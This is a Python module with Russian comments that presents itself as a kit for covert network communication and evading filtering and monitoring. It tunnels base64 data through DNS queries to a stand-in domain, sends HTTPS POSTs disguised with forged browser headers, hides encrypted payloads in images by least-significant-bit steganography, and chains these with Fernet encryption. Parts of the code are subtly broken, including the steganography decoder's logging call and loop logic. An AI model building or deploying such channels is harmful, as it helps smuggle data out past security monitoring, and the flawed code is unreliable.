#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
NetworkObfuscation - Модуль для скрытой сетевой коммуникации и обфускации
Включает DNS-туннелирование, TLS-обфускацию, стеганографию и шифрованные протоколы
"""

import os
import sys
import time
import json
import base64
import random
import socket
import struct
import logging
import threading
import http.client
import urllib.request
import urllib.parse
from typing import Dict, List, Any, Optional, Tuple, Union, Callable
from datetime import datetime

try:
    import dns.resolver
    import dns.message
    import dns.rdatatype
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    import cryptography
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding, hashes, hmac
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    from PIL import Image
    import numpy as np
    STEGO_AVAILABLE = True
except ImportError:
    STEGO_AVAILABLE = False

# Настройка логирования
logger = logging.getLogger("NetworkObfuscation")

class NetworkObfuscation:
    """
    Класс для обфускации сетевых коммуникаций, обхода фильтрации и мониторинга
    """
    
    def __init__(self, log_actions: bool = True):
        """
        Инициализация модуля обфускации сети
        
        Args:
            log_actions: Включить журналирование действий
        """
        self.log_actions = log_actions
        self.action_log = []
        self.encryption_key = None
        
        # Проверка доступности зависимостей
        self.capabilities = {
            "dns_tunneling": DNS_AVAILABLE,
            "encryption": CRYPTO_AVAILABLE,
            "steganography": STEGO_AVAILABLE,
            "https": True,  # Встроенные модули
            "http2": hasattr(http.client, 'HTTPSConnection') and hasattr(http.client.HTTPSConnection, 'set_tunnel')
        }
        
        # Генерируем ключ шифрования
        if CRYPTO_AVAILABLE:
            self.encryption_key = Fernet.generate_key()
            self.fernet = Fernet(self.encryption_key)
        
        logger.info(f"NetworkObfuscation инициализирован. Доступные функции: {self.capabilities}")
        self._log_action("init", f"NetworkObfuscation initialized with capabilities: {self.capabilities}")

    def _log_action(self, action_type: str, details: str) -> None:
        """
        Записывает действие в журнал
        
        Args:
            action_type: Тип действия (init, send, receive, etc)
            details: Детали действия
        """
        if self.log_actions:
            timestamp = datetime.now().isoformat()
            log_entry = {
                "timestamp": timestamp,
                "type": action_type,
                "details": details
            }
            self.action_log.append(log_entry)
            logger.debug(f"Action logged: {action_type} - {details}")
    
    def get_action_log(self) -> List[Dict[str, Any]]:
        """
        Возвращает журнал действий
        
        Returns:
            List[Dict[str, Any]]: Журнал действий
        """
        return self.action_log
    
    def get_capabilities(self) -> Dict[str, bool]:
        """
        Возвращает поддерживаемые функции обфускации
        
        Returns:
            Dict[str, bool]: Словарь с поддерживаемыми функциями
        """
        return self.capabilities
    
    # === DNS Tunneling ===
    
    def dns_tunnel_encode(self, data: bytes) -> List[str]:
        """
        Кодирует данные для передачи через DNS-туннель
        
        Args:
            data: Данные для отправки
            
        Returns:
            List[str]: Список DNS-запросов
        """
        if not DNS_AVAILABLE:
            raise ImportError("DNS tunneling requires dnspython package")
        
        self._log_action("dns_encode", f"Encoding {len(data)} bytes for DNS tunnel")
        
        # Кодируем данные в base64
        encoded = base64.b64encode(data).decode('ascii')
        
        # Разбиваем на части по 30 символов (максимум для поддомена)
        chunks = [encoded[i:i+30] for i in range(0, len(encoded), 30)]
        
        # Формируем DNS-запросы
        dns_queries = []
        for i, chunk in enumerate(chunks):
            # Добавляем случайный идентификатор и порядковый номер
            session_id = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(5))
            query = f"{session_id}-{i}-{chunk}.tunnel.example.com"
            dns_queries.append(query)
        
        return dns_queries
    
    def dns_tunnel_send(self, data: bytes, dns_server: str = "8.8.8.8") -> bool:
        """
        Отправляет данные через DNS-туннель
        
        Args:
            data: Данные для отправки
            dns_server: DNS-сервер для запросов
            
        Returns:
            bool: True если операция успешна
        """
        if not DNS_AVAILABLE:
            raise ImportError("DNS tunneling requires dnspython package")
        
        self._log_action("dns_send", f"Sending {len(data)} bytes via DNS tunnel to {dns_server}")
        
        try:
            # Кодируем данные
            dns_queries = self.dns_tunnel_encode(data)
            
            # Создаем резолвер
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [dns_server]
            resolver.timeout = 5
            resolver.lifetime = 5
            
            # Отправляем запросы
            for query in dns_queries:
                resolver.resolve(query, 'A')
                time.sleep(0.1)  # Задержка между запросами
            
            return True
        
        except Exception as e:
            logger.error(f"Error in DNS tunnel: {str(e)}")
            self._log_action("dns_error", f"DNS tunnel error: {str(e)}")
            return False
    
    # === HTTPS с TLS-обфускацией ===
    
    def https_send(self, url: str, data: bytes, headers: Optional[Dict[str, str]] = None, 
               mimic_browser: bool = True) -> Tuple[int, bytes]:
        """
        Отправляет данные через HTTPS с обфускацией
        
        Args:
            url: URL для отправки
            data: Данные для отправки
            headers: Заголовки HTTP
            mimic_browser: Имитировать браузер
            
        Returns:
            Tuple[int, bytes]: Код ответа и тело ответа
        """
        self._log_action("https_send", f"Sending {len(data)} bytes to {url}")
        
        if not headers:
            headers = {}
        
        # Имитация браузера
        if mimic_browser:
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
            ]
            headers["User-Agent"] = random.choice(user_agents)
            headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
            headers["Accept-Language"] = "en-US,en;q=0.5"
            headers["Accept-Encoding"] = "gzip, deflate, br"
            headers["DNT"] = "1"
            headers["Connection"] = "keep-alive"
            headers["Upgrade-Insecure-Requests"] = "1"
            headers["Sec-Fetch-Dest"] = "document"
            headers["Sec-Fetch-Mode"] = "navigate"
            headers["Sec-Fetch-Site"] = "none"
            headers["Sec-Fetch-User"] = "?1"
            headers["Cache-Control"] = "max-age=0"
        
        try:
            # Создаем запрос
            request = urllib.request.Request(url, data=data, headers=headers, method="POST")
            
            # Отправляем запрос
            with urllib.request.urlopen(request) as response:
                response_data = response.read()
                return response.status, response_data
        
        except Exception as e:
            logger.error(f"Error in HTTPS request: {str(e)}")
            self._log_action("https_error", f"HTTPS error: {str(e)}")
            return -1, str(e).encode()
    
    # === Стеганография ===
    
    def steganography_encode(self, data: bytes, image_path: str, output_path: str) -> bool:
        """
        Встраивает данные в изображение используя стеганографию (LSB)
        
        Args:
            data: Данные для встраивания
            image_path: Путь к изображению-контейнеру
            output_path: Путь для сохранения результата
            
        Returns:
            bool: True в случае успеха, False при ошибке
        """
        if not STEGO_AVAILABLE:
            raise ImportError("Steganography requires PIL and numpy packages")
        
        self._log_action("stego_encode", f"Encoding {len(data)} bytes into {image_path}")
        
        try:
            # Открываем изображение
            img = Image.open(image_path).convert('RGB')
            # Конвертируем в массив numpy
            img_array = np.array(img, dtype=np.uint8).copy()
            
            # Получаем размеры
            height, width = img_array.shape[0], img_array.shape[1]
            
            # Проверяем, что изображение достаточно большое для данных
            available_bits = height * width * 3
            required_bits = (len(data) + 4) * 8  # +4 байта для заголовка с размером
            
            if required_bits > available_bits:
                raise ValueError(f"Изображение слишком маленькое для встраивания {len(data)} байт данных")
            
            # Создаем заголовок - размер данных (4 байта)
            header = struct.pack('>I', len(data))
            
            # Добавляем заголовок к данным
            full_data = header + data
            
            # Конвертируем байты в биты
            bits = []
            for byte in full_data:
                for i in range(7, -1, -1):
                    bits.append((byte >> i) & 1)
            
            # Встраиваем биты в младшие биты изображения
            bit_idx = 0
            for i in range(height):
                for j in range(width):
                    for k in range(3):  # RGB каналы
                        if bit_idx < len(bits):
                            # Корректно изменяем младший бит пикселя, избегая проблем переполнения
                            pixel_value = img_array[i, j, k]
                            # Маскируем младший бит, затем устанавливаем нужное значение
                            img_array[i, j, k] = (pixel_value & 0xFE) | bits[bit_idx]
                            bit_idx += 1
                        else:
                            # Если все биты встроены, выходим из цикла
                            break
            
            # Создаем новое изображение из массива
            result_img = Image.fromarray(img_array)
            # Сохраняем результат
            result_img.save(output_path)
            
            self._log_action("stego_encode_success", f"Data successfully encoded into {output_path}")
            return True
        
        except Exception as e:
            logger.error(f"Error in steganography encode: {str(e)}")
            self._log_action("stego_encode_error", f"Steganography encode error: {str(e)}")
            return False

    def steganography_decode(self, image_path: str) -> bytes:
        """
        Извлекает данные из изображения, встроенные методом стеганографии
        
        Args:
            image_path: Путь к изображению со встроенными данными
            
        Returns:
            bytes: Извлеченные данные
        """
        if not STEGO_AVAILABLE:
            raise ImportError("Steganography requires PIL and numpy packages")
        
        self._log_action("stego_decode", f"Decoding data from {image_path}")
        
        try:
            # Открываем изображение
            img = Image.open(image_path).convert('RGB')
            # Конвертируем в массив numpy
            img_array = np.array(img, dtype=np.uint8)
            
            # Получаем размеры
            height, width = img_array.shape[0], img_array.shape[1]
            
            # Извлекаем биты из младших битов пикселей
            extracted_bits = []
            for i in range(height):
                for j in range(width):
                    for k in range(3):  # RGB каналы
                        # Извлекаем младший бит
                        bit = img_array[i, j, k] & 1
                        extracted_bits.append(bit)
                        
                        # Если мы считали достаточно бит для заголовка (32 бита = 4 байта),
                        # декодируем размер данных
                        if len(extracted_bits) == 32:
                            # Преобразуем первые 32 бита в 4 байта и получаем размер
                            header_bytes = self._bits_to_bytes(extracted_bits[:32])
                            data_size = struct.unpack('>I', header_bytes)[0]
                            
                            # Проверяем, что в изображении достаточно данных
                            required_bits = (data_size + 4) * 8
                            available_bits = height * width * 3
                            
                            if required_bits > available_bits:
                                raise ValueError(f"Некорректный размер данных: {data_size} байт")
            
            # Считываем необходимое количество бит для данных
            data_bits = extracted_bits[32:32 + data_size * 8]
            
            # Преобразуем биты в байты и возвращаем
            return self._bits_to_bytes(data_bits)
            
        except Exception as e:
            self._log_action("stego_decode", f"Error: {str(e)}", log_level="ERROR")
            raise

    def _bits_to_bytes(self, bits: List[int]) -> bytes:
        """
        Конвертирует список битов в байты
        
        Args:
            bits: Список битов (0 или 1)
            
        Returns:
            bytes: Байты, соответствующие битам
        """
        result = bytearray()
        for i in range(0, len(bits), 8):
            if i + 8 <= len(bits):
                byte = 0
                for j in range(8):
                    byte = (byte << 1) | bits[i + j]
                result.append(byte)
        return bytes(result)

    # === Шифрование ===

    def encrypt_data(self, data: bytes) -> bytes:
        """
        Шифрует данные с использованием Fernet (симметричное шифрование)
        
        Args:
            data: Данные для шифрования
            
        Returns:
            bytes: Зашифрованные данные
        """
        if not CRYPTO_AVAILABLE:
            raise ImportError("Encryption requires cryptography package")
        
        self._log_action("encrypt", f"Encrypting {len(data)} bytes")
        
        encrypted = self.fernet.encrypt(data)
        return encrypted

    def decrypt_data(self, encrypted_data: bytes) -> bytes:
        """
        Расшифровывает данные с использованием Fernet
        
        Args:
            encrypted_data: Зашифрованные данные
            
        Returns:
            bytes: Расшифрованные данные
        """
        if not CRYPTO_AVAILABLE:
            raise ImportError("Encryption requires cryptography package")
        
        self._log_action("decrypt", f"Decrypting {len(encrypted_data)} bytes")
        
        decrypted = self.fernet.decrypt(encrypted_data)
        return decrypted

    # === Комбинированные методы ===

    def send_encrypted_https(self, url: str, data: bytes) -> Tuple[int, bytes]:
        """
        Отправляет зашифрованные данные через HTTPS
        
        Args:
            url: URL для отправки
            data: Данные для отправки
            
        Returns:
            Tuple[int, bytes]: Код ответа и тело ответа
        """
        self._log_action("encrypted_https", f"Sending encrypted data to {url}")
        
        try:
            # Шифруем данные
            encrypted_data = self.encrypt_data(data)
            
            # Отправляем через HTTPS
            status, response = self.https_send(url, encrypted_data)
            
            # Дешифруем ответ, если успешно
            if status == 200 and CRYPTO_AVAILABLE:
                try:
                    decrypted_response = self.decrypt_data(response)
                    return status, decrypted_response
                except:
                    return status, response
            
            return status, response
        
        except Exception as e:
            logger.error(f"Error in encrypted HTTPS: {str(e)}")
            self._log_action("encrypted_https_error", f"Encrypted HTTPS error: {str(e)}")
            return -1, str(e).encode()

    def dns_tunnel_with_encryption(self, data: bytes, dns_server: str = "8.8.8.8") -> bool:
        """
        Отправляет зашифрованные данные через DNS-туннель
        
        Args:
            data: Данные для отправки
            dns_server: DNS-сервер для запросов
            
        Returns:
            bool: True если операция успешна
        """
        if not DNS_AVAILABLE or not CRYPTO_AVAILABLE:
            raise ImportError("DNS tunneling with encryption requires dnspython and cryptography packages")
        
        self._log_action("dns_encrypted", f"Sending encrypted data via DNS tunnel")
        
        try:
            # Шифруем данные
            encrypted_data = self.encrypt_data(data)
            
            # Отправляем через DNS-туннель
            return self.dns_tunnel_send(encrypted_data, dns_server)
        
        except Exception as e:
            logger.error(f"Error in DNS tunnel with encryption: {str(e)}")
            self._log_action("dns_encrypted_error", f"DNS tunnel with encryption error: {str(e)}")
            return False

    def steganography_with_encryption(self, data: bytes, image_path: str, output_path: str) -> bool:
        """
        Шифрует данные и встраивает их в изображение
        
        Args:
            data: Данные для скрытия
            image_path: Путь к исходному изображению
            output_path: Путь для сохранения изображения с данными
            
        Returns:
            bool: True если операция успешна
        """
        if not STEGO_AVAILABLE or not CRYPTO_AVAILABLE:
            raise ImportError("Combined method requires PIL, numpy and cryptography packages")
        
        self._log_action("combined_stego_encrypt", 
                       f"Encrypting and encoding {len(data)} bytes into image {image_path}")
        
        try:
            # Шифруем данные
            encrypted_data = self.encrypt_data(data)
            
            # Встраиваем зашифрованные данные в изображение
            result = self.steganography_encode(encrypted_data, image_path, output_path)
            
            return result
        
        except Exception as e:
            logger.error(f"Error in combined method: {str(e)}")
            self._log_action("combined_error", f"Combined steganography+encryption error: {str(e)}")
            return False

# Пример использования
if __name__ == "__main__":
    network_obfuscation = NetworkObfuscation()
    capabilities = network_obfuscation.get_capabilities()
    
    print("Доступные возможности сетевой обфускации:")
    for capability, available in capabilities.items():
        print(f"- {capability}: {'Доступно' if available else 'Недоступно'}")
    
    # Тестирование шифрования
    if capabilities["encryption"]:
        original_data = b"Secret message for testing encryption"
        encrypted = network_obfuscation.encrypt_data(original_data)
        decrypted = network_obfuscation.decrypt_data(encrypted)
        
        print("\nТест шифрования:")
        print(f"Оригинальные данные: {original_data}")
        print(f"Зашифрованные данные: {encrypted[:30]}...")
        print(f"Расшифрованные данные: {decrypted}")
        print(f"Совпадают: {original_data == decrypted}") 